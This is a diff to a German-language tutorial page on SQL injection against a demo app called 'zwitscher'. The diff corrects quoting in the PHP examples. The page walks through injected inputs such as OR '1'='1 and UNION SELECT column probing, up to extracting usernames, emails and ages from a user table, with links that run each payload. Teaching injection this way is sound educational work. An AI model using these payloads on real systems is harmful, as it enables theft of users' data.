@@ -255,7 +255,7 @@ $sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
 Eingabe: <span style="color:crimson">#cat</span>
 
 ```php
-$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat';
+$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat';";
 ```
 
 [Code ausführen](../zwitscher/?search=%23cat)
@@ -274,7 +274,7 @@ $sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
 Eingabe: <span style="color:crimson">#cat' OR hashtag = '#trivia</span>
 
 ```php
-$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat' OR hashtag='#trivia';
+$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat' OR hashtag='#trivia';";
 ```
 
 [Code ausführen](../zwitscher/?search=%23cat%27+OR+hashtag%3D%27%23trivia)
@@ -293,7 +293,7 @@ $sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
 Eingabe: <span style="color:crimson">#dog' OR '1'='1</span>
 
 ```php
-$sql = "SELECT * FROM zwitscher WHERE hashtag = '#dog' OR '1'='1';
+$sql = "SELECT * FROM zwitscher WHERE hashtag = '#dog' OR '1'='1';";
 ```
 
 [Code ausführen](../zwitscher/?search=%23dog%27+OR+%271%27%3D%271)
@@ -374,7 +374,7 @@ Eingabe: <span style="color:crimson">#dog' UNION SELECT *  FROM user</span>
 ```php
 $sql = "SELECT *
         FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT * FROM user';
+        WHERE hashtag = '#dog' UNION SELECT * FROM user';";
 ```
 
 [Code ausführen](../zwitscher/?search=%23hashtag%27+UNION+SELECT+*+FROM+user)
@@ -402,7 +402,7 @@ Eingabe: <span style="color:crimson">#dog' UNION SELECT *  FROM user; -- </span>
 ```php
 $sql = "SELECT *
         FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT * FROM user; -- ';
+        WHERE hashtag = '#dog' UNION SELECT * FROM user; -- ';";
 ```
 
 [Code ausführen](../zwitscher/?search=%27+UNION+SELECT+*+FROM+user%3B+--+)
@@ -446,7 +446,7 @@ Eingabe: <span style="color:crimson">#dog' UNION SELECT 1; -- </span>
 ```php
 $sql = "SELECT *
         FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT 1; -- ';
+        WHERE hashtag = '#dog' UNION SELECT 1; -- ';";
 ```
 
 [Code ausführen](../zwitscher/?search=%27+UNION+SELECT+1%3B+--+)
@@ -462,7 +462,7 @@ Eingabe: <span style="color:crimson">#dog' UNION SELECT 1, 2; -- </span>
 ```php
 $sql = "SELECT * 
         FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT 1, 2; -- ';
+        WHERE hashtag = '#dog' UNION SELECT 1, 2; -- ';";
 ```
 
 [Code ausführen](../zwitscher/?search=%27+UNION+SELECT+1%2C+2%3B+--+)
@@ -478,7 +478,7 @@ Eingabe: <span style="color:crimson">#dog' UNION SELECT 1, 2, 3; -- </span>
 ```php
 $sql = "SELECT *
         FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT 1, 2, 3; -- ';
+        WHERE hashtag = '#dog' UNION SELECT 1, 2, 3; -- ';";
 ```
 
 [Code ausführen](../zwitscher/?search=%27+UNION+SELECT+1%2C+2%2C+3%3B+--+)
@@ -500,7 +500,7 @@ Eingabe: <span style="color:crimson">#dog' UNION SELECT username, mail, age FROM
 ```php
 $sql = "SELECT *
         FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT username, mail, age FROM user; -- ';
+        WHERE hashtag = '#dog' UNION SELECT username, mail, age FROM user; -- ';";
 ```
 
 [Code ausführen](../zwitscher/?search=%23dog%27+UNION+SELECT+username%2C+mail%2C+age+FROM+user%3B+--+)
